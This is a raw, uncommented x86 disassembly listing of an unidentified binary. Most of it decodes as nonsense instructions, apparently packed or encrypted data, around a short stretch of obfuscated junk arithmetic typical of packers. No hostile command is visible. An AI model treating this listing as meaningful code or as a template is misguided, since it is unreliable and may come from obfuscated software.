  417570:	pop    edx
  417571:	ins    BYTE PTR es:[edi],dx
  417572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417573:	(bad)  
  417574:	in     eax,0x88
  417576:	push   esi
  417577:	scas   eax,DWORD PTR es:[edi]
  417578:	sub    eax,DWORD PTR [edi+0x10512186]
  41757e:	mov    al,ds:0xa101dd6e
  417583:	or     edx,eax
  417585:	int    0x3
  417587:	inc    ebp
  417588:	inc    eax
  417589:	xchg   esi,eax
  41758a:	lea    edx,[eax]
  41758c:	lahf   
  41758d:	sub    edx,DWORD PTR [ecx]
  41758f:	jl     0x417542
  417591:	and    esi,DWORD PTR [eax+0x565ef824]
  417597:	cmp    eax,0xe8cea37e
  41759c:	arpl   WORD PTR [ebp+0x1aebef9a],bx
  4175a2:	pop    esp
  4175a3:	fmulp  st(2),st
  4175a5:	jecxz  0x417610
  4175a7:	sti    
  4175a8:	jb     0x417624
  4175aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ab:	into   
  4175ac:	mov    BYTE PTR [edx-0x54],ah
  4175af:	lahf   
  4175b0:	jecxz  0x417588
  4175b2:	push   0xffffff8e
  4175b4:	shl    BYTE PTR [ebx+0xdbc80d2],1
  4175ba:	mov    eax,ebp
  4175bc:	and    edi,DWORD PTR [edx]
  4175be:	stos   BYTE PTR es:[edi],al
  4175bf:	pop    ss
  4175c0:	(bad)  
  4175c1:	and    BYTE PTR [eax],bl
  4175c3:	or     eax,0x3c28ec35
  4175c8:	test   bl,bh
  4175ca:	mov    ebp,0x3e7b8e54
  4175cf:	adc    dl,BYTE PTR [edi+ebx*1+0x32]
  4175d3:	xor    eax,DWORD PTR [ebx]
  4175d5:	jbe    0x4175fb
  4175d7:	scas   al,BYTE PTR es:[edi]
  4175d8:	jl     0x417622
  4175da:	clc    
  4175db:	push   0x887ef76f
  4175e0:	inc    esi
  4175e1:	out    0xe5,eax
  4175e3:	jno    0x4175b0
  4175e5:	outs   dx,DWORD PTR ds:[esi]
  4175e6:	std    
  4175e7:	in     eax,0x54
  4175e9:	retf   0xc26b
  4175ec:	retf   0x1c94
  4175ef:	fild   QWORD PTR [ebp-0x5b4d59c0]
  4175f5:	push   ecx
  4175f6:	mov    bl,0xdc
  4175f8:	ret    
  4175f9:	loopne 0x417621
  4175fb:	xchg   ebx,eax
  4175fc:	xor    DWORD PTR [edx+0x70],edx
  4175ff:	add    eax,0x7819f6b6
  417604:	sub    al,0x2a
  417606:	jmp    0x197d:0x6b78dce1
  41760d:	dec    esp
  41760e:	ins    DWORD PTR es:[edi],dx
  41760f:	or     edx,esi
  417611:	sti    
  417612:	into   
  417613:	cs xchg ecx,eax
  417615:	push   cs
  417616:	clc    
  417617:	push   ecx
  417618:	mov    ds:0x9872c891,eax
  41761d:	dec    edx
  41761e:	mov    al,ds:0xe7198477
  417623:	enter  0x3ef0,0x94
  417627:	adc    DWORD PTR [esi],0xb13cfff4
  41762d:	xor    eax,0x15f03aaa
  417632:	fs push di
  417635:	in     eax,0x2c
  417637:	in     eax,dx
  417638:	div    BYTE PTR [esi]
  41763a:	mov    cl,0x9e
  41763c:	arpl   WORD PTR [ebx-0x1ae4c8de],di
  417642:	sub    eax,0x100328de
  417647:	xchg   BYTE PTR [ecx+0x7],bl
  41764a:	xchg   edx,eax
  41764b:	and    BYTE PTR [ebx],cl
  41764d:	bound  ecx,QWORD PTR ds:0x2a9fc0e2
  417653:	xchg   esi,eax
  417654:	lock lea eax,[eax]
  417657:	in     eax,0x22
  417659:	outs   dx,BYTE PTR ds:[esi]
  41765a:	loope  0x4176a3
  41765c:	cmp    dh,BYTE PTR [eax+edx*8-0x70]
  417660:	test   BYTE PTR [edx+ebx*2],0xf6
  417664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417665:	fdivr  QWORD PTR [esi]
  417667:	clc    
  417668:	cdq    
  417669:	int3   
  41766a:	and    ebp,ebx
  41766c:	jmp    0xff7fbed7
  417671:	xor    edi,DWORD PTR [edx-0x2512f399]
  417677:	pop    edi
  417678:	xchg   ebx,ecx
  41767a:	dec    eax
  41767b:	sub    esp,DWORD PTR [esi]
  41767d:	jge    0x4176b5
  41767f:	mov    ds:0x2f09a394,eax
  417684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417685:	dec    ebp
  417686:	dec    ebp
  417687:	addr16 push ecx
  417689:	fist   DWORD PTR [eax-0x30]
  41768c:	retf   0x499d
  41768f:	push   edx
  417690:	jb     0x417669
  417692:	aad    0x50
  417694:	imul   ecx,DWORD PTR [ecx-0x49],0x3
  417698:	push   eax
  417699:	dec    eax
  41769a:	out    0x86,al
  41769c:	lahf   
  41769d:	jmp    0x4176e2
  41769f:	mov    ds,WORD PTR [esi+0x1280ac87]
  4176a5:	mov    edx,0xdd73325f
  4176aa:	xchg   DWORD PTR [ecx+0x33b2c524],edi
  4176b0:	jne    0x417722
  4176b2:	xchg   dh,bl
  4176b4:	sahf   
  4176b5:	inc    edx
  4176b6:	sbb    ch,BYTE PTR [edi]
  4176b8:	loop   0x41772b
  4176ba:	pushf  
  4176bb:	mov    ah,0x4a
  4176bd:	add    al,0xa6
  4176bf:	cmp    dh,dh
  4176c1:	mov    esp,0x5e6b1e55
  4176c6:	or     BYTE PTR [ebx-0x1f],ah
  4176c9:	in     al,dx
  4176ca:	(bad)  
  4176cb:	(bad)
  4176ce:	jl     0x417728
  4176d0:	lock fdivr QWORD PTR [ecx]
  4176d3:	xchg   DWORD PTR [ebp-0x5d],edi
  4176d6:	dec    esp
  4176d7:	cwde   
  4176d8:	sbb    BYTE PTR [edi+edx*1+0x7f],dl
  4176dc:	cmp    al,0x61
  4176de:	push   ss
  4176df:	sub    al,0x5b
  4176e1:	mov    bl,0xf4
  4176e3:	mov    esi,0xcef3a4b2
  4176e8:	mov    ah,0x64
  4176ea:	jmp    0x2d91:0xded463d8
  4176f1:	cli    
  4176f2:	sar    BYTE PTR [edx-0x54],cl
  4176f5:	pop    edx
  4176f6:	jbe    0xfd330343
  4176fc:	cs (bad) 
  4176fe:	sub    dh,BYTE PTR ds:0x53d04c01
  417704:	push   ss
  417705:	mov    ch,0x26
  417707:	cmp    ebp,DWORD PTR [eax]
  417709:	aad    0x78
  41770b:	stos   DWORD PTR es:[edi],eax
  41770c:	sub    al,0xe9
  41770e:	stos   BYTE PTR es:[edi],al
  41770f:	iret   
  417710:	daa    
  417711:	or     DWORD PTR [eax-0x7a9d01aa],ebp
  417717:	das    
  417718:	mov    bl,BYTE PTR [eax-0x306803df]
  41771e:	(bad)  
  41771f:	outs   dx,DWORD PTR ds:[esi]
  417720:	test   DWORD PTR ds:0xf9739b49,ecx
  417726:	mov    al,0xdc
  417728:	push   0x52
  41772a:	pop    ebp
  41772b:	enter  0x5c0e,0x47
  41772f:	ss call 0x9ac960b0
  417735:	sahf   
  417736:	push   ecx
  417737:	xchg   ecx,eax
  417738:	outs   dx,DWORD PTR ds:[esi]
  417739:	mov    esp,0x91ae3b35
  41773e:	push   ebp
  41773f:	stc    
  417740:	out    dx,al
  417741:	aas    
  417742:	cld    
  417743:	out    dx,al
  417744:	das    
  417745:	xchg   DWORD PTR ds:0x67c6d109,ebx
  41774b:	push   cs
  41774c:	into   
  41774d:	test   eax,0x3773eb93
  417752:	(bad)  
  417753:	jnp    0x4176dd
  417755:	xchg   dh,cl
  417757:	mov    ecx,0xd115aa60
  41775c:	mov    cl,0x29
  41775e:	adc    al,0x1b
  417760:	es jg  0x4177a4
  417763:	sbb    al,0x7d
  417765:	pop    eax
  417766:	or     DWORD PTR [eax+eiz*2+0x5fca6fc3],0x552ac40d
  417771:	loope  0x4177ba
  417773:	ins    BYTE PTR es:[edi],dx
  417774:	cmc    
  417775:	mov    dl,0x93
  417777:	xchg   edi,eax
  417778:	cdq    
  417779:	mov    BYTE PTR [esi],dh
  41777b:	pop    esp
  41777c:	ss mov ebx,0x75bda19f
  417782:	dec    ecx
  417783:	dec    edi
  417784:	push   esi
  417785:	xchg   ebp,ecx
  417787:	xor    ebx,eax
  417789:	mov    ebx,0xf89b2fab
  41778e:	into   
  41778f:	hlt    
  417790:	xor    eax,0x9dd0435f
  417795:	and    BYTE PTR [eax-0x57],dl
  417798:	in     al,0x2
  41779a:	out    dx,eax
  41779b:	fild   DWORD PTR [ebp+edx*4-0x20701cca]
  4177a2:	les    ecx,FWORD PTR [esi+0x60c604a1]
  4177a8:	ins    DWORD PTR es:[edi],dx
  4177a9:	mov    al,ds:0x451590f0
  4177ae:	lock jmp 0x41779b
  4177b1:	in     eax,0x9b
  4177b3:	mul    BYTE PTR [eax]
  4177b5:	push   eax
  4177b6:	mov    ebx,0x4f860c6d
  4177bb:	scas   eax,DWORD PTR es:[edi]
  4177bc:	xlat   BYTE PTR ds:[ebx]
  4177bd:	dec    eax
  4177be:	(bad)  
  4177bf:	mov    ebx,0x3cb51158
  4177c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177c5:	je     0x417807
  4177c7:	pop    edx
  4177c8:	(bad)  
  4177c9:	in     al,dx
  4177ca:	push   cs
  4177cb:	out    dx,al
  4177cc:	and    ch,cl
  4177ce:	push   ds
  4177cf:	adc    al,0x30
  4177d1:	cmp    al,0x96
  4177d3:	cmp    al,0x2d
  4177d5:	(bad)  
  4177d6:	loop   0x417784
  4177d8:	ins    BYTE PTR es:[edi],dx
  4177d9:	(bad)  [edi-0x52b6c22]
  4177df:	outs   dx,BYTE PTR ds:[esi]
  4177e0:	or     eax,0xe419078a
  4177e5:	mov    ebp,0xded0c4ca
  4177ea:	fcom   DWORD PTR [edi]
  4177ec:	xor    dh,BYTE PTR [edx]
  4177ee:	and    DWORD PTR [esi-0x70],0xffffff83
  4177f2:	imul   esp,eax,0xd3393776
  4177f8:	cmp    bh,dl
  4177fa:	mov    esp,DWORD PTR [edx-0x21]
  4177fd:	or     ebp,edi
  4177ff:	(bad)  
  417800:	push   ebx
  417801:	ds cmp eax,0x9719650e
  417807:	imul   edi,DWORD PTR [edi+eax*4-0x5e9abf45],0x1bc63821
  417812:	sub    DWORD PTR [eax+ebx*2+0x8b6c43b],ebx
  417819:	ds test eax,0x9cb563fd
  41781f:	cmp    al,0x97
  417821:	aam    0x2f
  417823:	aaa    
  417824:	push   ebp
  417825:	mov    edi,0xb4ecfd7c
  41782a:	xchg   esp,eax
  41782b:	ins    DWORD PTR es:[edi],dx
  41782c:	xchg   si,ax
  41782e:	xchg   esp,eax
  41782f:	push   ebp
  417830:	inc    ebx
  417831:	inc    esi
  417832:	sub    al,0xd5
  417834:	mov    fs,WORD PTR [edi]
  417836:	pop    eax
  417837:	cdq    
  417838:	mov    bl,0x27
  41783a:	int    0x78
  41783c:	adc    eax,0xd9302e85
  417841:	test   BYTE PTR [eax],cl
  417843:	stos   DWORD PTR es:[edi],eax
  417844:	rcr    DWORD PTR [edx+0x60],1
  417847:	add    ebx,ebx
  417849:	fs mov ebp,0xca8605e0
  41784f:	sub    ah,cl
  417851:	test   eax,0xd319a6bf
  417856:	mul    DWORD PTR [eax]
  417858:	aad    0x1
  41785a:	xchg   edx,eax
  41785b:	sub    ebp,DWORD PTR [esi]
  41785d:	mov    dh,0xc8
  41785f:	xor    al,0x4
  417861:	mov    es,WORD PTR [edi]
  417863:	clc    
  417864:	xchg   edx,eax
  417865:	in     eax,0xb8
  417867:	mov    bl,BYTE PTR ds:0xb98f2043
  41786d:	adc    eax,0x4b7468c5
  417872:	mov    ch,BYTE PTR [ecx+0x4a]
  417875:	jp     0x417884
  417877:	daa    
  417878:	jl     0x41785c
  41787a:	add    BYTE PTR [esi+ebx*1],ah
  41787d:	lods   al,BYTE PTR ds:[esi]
  41787e:	rol    esi,cl
  417880:	(bad)  
  417881:	pop    ss
  417882:	pop    esi
  417883:	adc    DWORD PTR [edi],ebp
  417885:	mov    esp,0x5100dea
  41788a:	pop    esp
  41788b:	retf   
  41788c:	jae    0x41783a
  41788e:	je     0x417863
  417890:	out    dx,al
  417891:	xchg   ebp,eax
  417892:	rol    BYTE PTR [edx-0x4e1f377e],1
  417898:	lods   al,BYTE PTR ds:[esi]
  417899:	fbld   TBYTE PTR [eax+0x1aad14ab]
  41789f:	into   
  4178a0:	inc    esi
  4178a1:	loopne 0x4178ae
  4178a3:	arpl   WORD PTR [ebx],cx
  4178a5:	adc    bl,BYTE PTR [edx-0x7b]
  4178a8:	data16 mov ds:0x42a2cbea,al
  4178ae:	push   0x66
  4178b0:	sub    BYTE PTR [esi+0x1e],ah
  4178b3:	adc    al,0x7f
  4178b5:	mov    esi,0x426a9888
  4178ba:	jno    0x41786c
  4178bc:	lods   al,BYTE PTR ds:[esi]
  4178bd:	int    0x1b
  4178bf:	xchg   edi,eax
  4178c0:	jle    0x417842
  4178c2:	mov    ss,edi
  4178c4:	rcr    BYTE PTR [eax-0xaa68661],0x2b
  4178cb:	adc    ebp,DWORD PTR [ecx]
  4178cd:	mov    dh,0xb1
  4178cf:	dec    esi
  4178d0:	and    eax,0xfd2f01c3
  4178d5:	xchg   ebx,eax
  4178d6:	pusha  
  4178d7:	add    ebx,DWORD PTR [esi-0x5]
  4178da:	inc    edi
  4178db:	pushf  
  4178dc:	mov    bl,0x0
  4178de:	inc    ecx
  4178df:	xor    BYTE PTR [esi],ah
  4178e1:	mov    ah,0x1b
  4178e3:	fld    QWORD PTR ds:0xb20b1d73
  4178e9:	adc    edi,DWORD PTR [eax+0x7]
  4178ec:	mov    ah,BYTE PTR [edx+ebp*2]
  4178ef:	add    BYTE PTR [ecx+0x42827725],al
  4178f5:	add    BYTE PTR [esi-0xffff91],dh
  4178fb:	xor    DWORD PTR [ecx+0x4282170d],eax
  417901:	add    BYTE PTR [edi],ch
  417903:	add    BYTE PTR gs:[eax],al
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42822f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428217,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282b7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42827f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42822f,0x428237
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x4282f3,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42824f,0x42817b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42813b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42823f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42827b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428387
  4179bb:	add    DWORD PTR ds:0x42814b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428273,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428133,0x42834f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42814b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428237
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282d7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428253,0x0
  417a53:	mov    DWORD PTR ds:0x4282cf,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428247,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428253,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428dc4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428227,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282b3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42816b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42817b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42813f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ebp+ecx*2-0x514f524b],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0x6bb11818],bh
  417b02:	pop    esp
  417b03:	xor    DWORD PTR [esp+ecx*8+0x56ad3c95],esp
  417b0a:	mov    BYTE PTR [ebp+eax*1+0x78a6f1dd],ah
  417b11:	jp     0x417b59
  417b13:	pop    edx
  417b14:	cmp    BYTE PTR [edx-0x138d6ebf],bh
  417b1a:	xor    ebp,0x79
  417b1d:	push   ss
  417b1e:	or     DWORD PTR [esi-0x36],edx
  417b21:	jae    0x417af0
  417b23:	repnz and al,0x7d
  417b26:	push   esp
  417b27:	cmp    BYTE PTR [ebp+0x32],0xb7
  417b2b:	mov    esp,DWORD PTR [esi+ebp*8-0x17]
  417b2f:	mov    bl,0xa4
  417b31:	xchg   ebp,eax
  417b32:	or     DWORD PTR [eax],0x3061a253
  417b38:	fdivrp st(6),st
  417b3a:	jnp    0x417b88
  417b3c:	sbb    cl,BYTE PTR [eax]
  417b3e:	mov    ecx,0x2851944
  417b43:	shl    ch,0xaa
  417b46:	mov    al,ds:0xa433090d
  417b4b:	aam    0xd9
  417b4d:	mov    ch,ah
  417b4f:	mov    cl,0x91
  417b51:	stc    
  417b52:	xchg   esp,eax
  417b53:	imul   edx,eax,0xffffffe1
  417b56:	mov    ch,0xea
  417b58:	fcmovbe st,st(7)
  417b5a:	cdq    
  417b5b:	sbb    DWORD PTR [eax+0x46],edx
  417b5e:	xchg   ecx,eax
  417b5f:	fistp  DWORD PTR [eax]
  417b61:	push   ss
  417b62:	sbb    bl,dl
  417b64:	mov    ds:0x41f3264d,al
  417b69:	ja     0x417b08
  417b6b:	fnstcw WORD PTR [ebp+eiz*1+0x27bf0161]
  417b72:	cli    
  417b73:	cmc    
  417b74:	shr    BYTE PTR [eax+edi*1],1
  417b77:	jmp    0x57d6:0xa20b81a
  417b7e:	mov    ah,0x1b
  417b80:	adc    edi,DWORD PTR [ebx]
  417b82:	mov    ds:0xf7f17ad1,al
  417b87:	scas   eax,DWORD PTR es:[edi]
  417b88:	jae    0x417b5f
  417b8a:	mov    ecx,0xaa179282
  417b8f:	jno    0x417b8c
  417b91:	mov    al,gs:0xbad97e21
  417b97:	sbb    DWORD PTR [ecx+0x737b587],0x5d
  417b9e:	(bad)  
  417b9f:	sti    
  417ba0:	(bad)  
  417ba1:	cdq    
  417ba2:	jo     0x417bb1
  417ba4:	mov    esi,0x3e3185d8
  417ba9:	push   ecx
  417baa:	ret    0x9514
  417bad:	add    DWORD PTR [ecx+0x13],ecx
  417bb0:	ja     0x417c15
  417bb2:	fsubr  QWORD PTR [ebp-0x59b72da8]
  417bb8:	push   ss
  417bb9:	sub    DWORD PTR [ecx+eax*4-0x3f],ecx
  417bbd:	jnp    0x417c10
  417bbf:	jns    0x417b5a
  417bc1:	inc    ecx
  417bc2:	xchg   esi,eax
  417bc3:	lods   al,BYTE PTR ds:[esi]
  417bc4:	inc    ecx
  417bc5:	jbe    0x417bd4
  417bc7:	icebp  
  417bc8:	mov    dl,0xc
  417bca:	mov    dh,0xdd
  417bcc:	std    
  417bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bce:	arpl   dx,bp
  417bd0:	out    dx,al
  417bd1:	xchg   edi,eax
  417bd2:	mov    ebp,0x82733389
  417bd7:	sub    al,BYTE PTR [esi+0x3b]
  417bda:	add    BYTE PTR [edx],dl
  417bdc:	repnz fwait
  417bde:	(bad)
  417be1:	jmp    0x417b6e
  417be3:	aaa    
  417be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417be5:	jno    0x417bec
  417be7:	or     BYTE PTR [eax+0x1d],bl
  417bea:	jp     0x417b7b
  417bec:	mov    BYTE PTR [ecx+edx*8+0x4e],cl
  417bf0:	call   DWORD PTR [ebx+0x3d]
  417bf3:	inc    edx
  417bf4:	mov    bl,ah
  417bf6:	fdiv   QWORD PTR [edi+0x21]
  417bf9:	retfw  0x5bef
  417bfd:	push   ds
  417bfe:	int3   
  417bff:	int    0x57
  417c01:	test   eax,0x313df592
  417c06:	aaa    
  417c07:	push   ebx
  417c08:	mov    dh,0x69
  417c0a:	nop
  417c0b:	push   esi
  417c0c:	xor    al,0xf9
  417c0e:	nop
  417c0f:	pop    edx
  417c10:	cmp    eax,0xdf738707
  417c15:	js     0x417bd5
  417c17:	mov    ebp,0x43ebd2
  417c1c:	jbe    0x417bad
  417c1e:	cmp    al,0x99
  417c20:	repnz inc eax
  417c22:	push   ds
  417c23:	aad    0x91
  417c25:	(bad)  
  417c26:	shl    BYTE PTR [ecx+0x4bd30849],cl
  417c2c:	adc    esi,edi
  417c2e:	dec    esp
  417c2f:	cmp    eax,0xe4435d0c
  417c34:	pop    edi
  417c35:	lock or ebp,edx
  417c38:	test   DWORD PTR [ebx-0x48],ecx
  417c3b:	out    0x34,al
  417c3d:	(bad)  
  417c3e:	mov    dl,0xfc
  417c40:	xchg   edx,eax
  417c41:	mov    fs:0x30c213d9,eax
  417c47:	into   
  417c48:	(bad)  [esi]
  417c4a:	fs pop ebx
  417c4c:	push   esp
  417c4d:	rol    DWORD PTR [ebp-0x54],cl
  417c50:	lds    ecx,FWORD PTR [ebx-0x7d410e12]
  417c56:	sbb    eax,0x96708dbd
  417c5b:	clc    
  417c5c:	mov    esi,0x55a8c62
  417c61:	sbb    BYTE PTR [ebx+0x7e],0xf2
  417c65:	mov    ecx,0xba06bc19
  417c6a:	pop    ds
  417c6b:	and    ecx,esp
  417c6d:	or     eax,0x7ba96479
  417c72:	mov    ebx,0xde075680
  417c77:	aas    
  417c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c79:	je     0x417cb8
  417c7b:	pop    ds
  417c7c:	jns    0x417caf
  417c7e:	push   cs
  417c7f:	cmp    al,0x75
  417c81:	and    bl,BYTE PTR [ebx-0x74f31bb9]
  417c87:	inc    ebp
  417c88:	pop    es
  417c89:	pop    esi
  417c8a:	dec    esi
  417c8b:	scas   al,BYTE PTR es:[edi]
  417c8c:	xchg   ecx,eax
  417c8d:	mov    ds:0x37193ca3,eax
  417c92:	xor    al,0xc5
  417c94:	adc    eax,0xbe1c1cbf
  417c99:	xchg   ebp,eax
  417c9a:	push   0x25
  417c9c:	dec    eax
  417c9d:	(bad)  
  417c9e:	test   DWORD PTR [edx],esi
  417ca0:	jno    0x417ce6
  417ca2:	cwde   
  417ca3:	mov    eax,0xcde47e97
  417ca8:	adc    ecx,DWORD PTR [esi-0x2f71be4f]
  417cae:	std    
  417caf:	sbb    al,0x32
  417cb1:	cmp    al,0xcf
  417cb3:	adc    dh,BYTE PTR ds:0xea328e9a
  417cb9:	cdq    
  417cba:	cmp    DWORD PTR ds:0xb5ff73e3,edi
  417cc0:	pop    ebp
  417cc1:	repz icebp 
  417cc3:	fild   DWORD PTR [eax+0x6a]
  417cc6:	fst    QWORD PTR [ecx-0x30]
  417cc9:	fcomip st,st(5)
  417ccb:	dec    ebp
  417ccc:	sub    esp,ebp
  417cce:	push   ds
  417ccf:	mov    bh,0x4b
  417cd1:	mov    al,0x2a
  417cd3:	out    dx,al
  417cd4:	adc    al,0x2c
  417cd6:	stos   BYTE PTR es:[edi],al
  417cd7:	xor    BYTE PTR [ebx+0x15b2950],bl
  417cdd:	add    ebx,DWORD PTR [edi-0x45f0cee8]
  417ce3:	mov    al,al
  417ce5:	mov    bh,0x5f
  417ce7:	xor    bl,cl
  417ce9:	add    esi,edi
  417ceb:	ror    BYTE PTR ds:0x9c7de187,cl
  417cf1:	fwait
  417cf2:	sbb    al,0x91
  417cf4:	inc    ebx
  417cf5:	inc    eax
  417cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cf7:	inc    esp
  417cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf9:	sub    si,WORD PTR [edx+0x5a]
  417cfd:	pop    ebx
  417cfe:	jo     0x417cde
  417d00:	mov    ds:0x404072bb,al
  417d05:	push   ebp
  417d06:	pop    es
  417d07:	outs   dx,BYTE PTR ds:[esi]
  417d08:	(bad)  
  417d09:	dec    ebx
  417d0a:	nop
  417d0b:	add    al,0x6d
  417d0d:	lock pop eax
  417d0f:	(bad)  
  417d10:	addr16 fwait
  417d12:	mov    eax,0x63a325c1
  417d17:	cdq    
  417d18:	jp     0x417d23
  417d1a:	sbb    eax,0x54e13acc
  417d1f:	cli    
  417d20:	fist   WORD PTR [edi]
  417d22:	push   0x47f0da84
  417d27:	fist   WORD PTR [ebx-0x3d5b35c6]
  417d2d:	pusha  
  417d2e:	fwait
  417d2f:	cmp    DWORD PTR [ebx+0x3fd0e3e8],eax
  417d35:	lahf   
  417d36:	js     0x417d6c
  417d38:	(bad)  
  417d39:	dec    eax
  417d3a:	(bad)  
  417d3b:	jmp    0x9f92fd2a
  417d40:	(bad)  
  417d41:	pop    ds
  417d42:	mul    DWORD PTR [ecx+0x5a]
  417d45:	in     eax,0x68
  417d47:	(bad)  
  417d49:	adc    DWORD PTR [edi*2-0x63d7b272],0xffffffa6
  417d51:	push   edi
  417d52:	icebp  
  417d53:	push   es
  417d54:	sbb    al,0x91
  417d56:	cmp    al,0x95
  417d58:	inc    ebx
  417d59:	push   ecx
  417d5a:	test   eax,0xd99dbaa
  417d5f:	xchg   edx,eax
  417d60:	jb     0x417d4a
  417d62:	pop    ecx
  417d63:	fbstp  TBYTE PTR [ecx+edx*4-0x31]
  417d67:	sti    
  417d68:	or     al,0xab
  417d6a:	mov    ecx,0x43fd08f7
  417d6f:	mov    es,WORD PTR [edi]
  417d71:	pop    esp
  417d72:	xor    esi,DWORD PTR [esi-0x15f525ce]
  417d78:	jmp    FWORD PTR [ebp-0x55]
  417d7b:	int    0x1f
  417d7d:	mov    DWORD PTR [ebx+0x3e],ebp
  417d80:	adc    eax,0xf0820e5e
  417d85:	cs test eax,0x6237227e
  417d8b:	les    ebp,FWORD PTR fs:[esi-0x194ec182]
  417d92:	push   edi
  417d93:	xor    ebp,edx
  417d95:	mov    dh,0x68
  417d97:	nop
  417d98:	gs jae 0x417dbc
  417d9b:	bound  esp,QWORD PTR [ebx-0x453d64ac]
  417da1:	lahf   
  417da2:	mov    ebp,eax
  417da4:	out    0xf9,al
  417da6:	xor    eax,0x89eadc90
  417dab:	jns    0x417d58
  417dad:	out    dx,al
  417dae:	bound  ebx,QWORD PTR [ebx]
  417db0:	add    DWORD PTR [esi+0x6],ebp
  417db3:	mov    esp,0xa7ab016f
  417db8:	sbb    ebx,eax
  417dba:	mov    edi,0x3140e44e
  417dbf:	ret    
  417dc0:	xchg   ebp,eax
  417dc1:	not    BYTE PTR [esi-0x1dc93931]
  417dc7:	dec    ebp
  417dc8:	pop    ebx
  417dc9:	or     al,0x4d
  417dcb:	mov    ebx,0x24ca6a41
  417dd0:	xchg   edi,eax
  417dd1:	stc    
  417dd2:	xor    al,0x81
  417dd4:	imul   DWORD PTR [eax]
  417dd6:	inc    edi
  417dd7:	inc    ebx
  417dd8:	lods   al,BYTE PTR ds:[esi]
  417dd9:	jns    0x417df6
  417ddb:	ret    0x9831
  417dde:	int    0xb2
  417de0:	xchg   ebx,eax
  417de1:	pushf  
  417de2:	(bad)  
  417de3:	icebp  
  417de4:	mov    ecx,0x5a27b66
  417de9:	test   al,0x92
  417deb:	ss in  al,dx
  417ded:	lds    esp,FWORD PTR [eax-0x48]
  417df0:	out    0xe2,eax
  417df2:	je     0x417e26
  417df4:	mov    al,ds:0x547453ad
  417df9:	out    0x7,eax
  417dfb:	jne    0x417dab
  417dfd:	mov    edi,0x87ded22
  417e02:	popf   
  417e03:	fist   WORD PTR [ebp-0x49]
  417e06:	pop    ebx
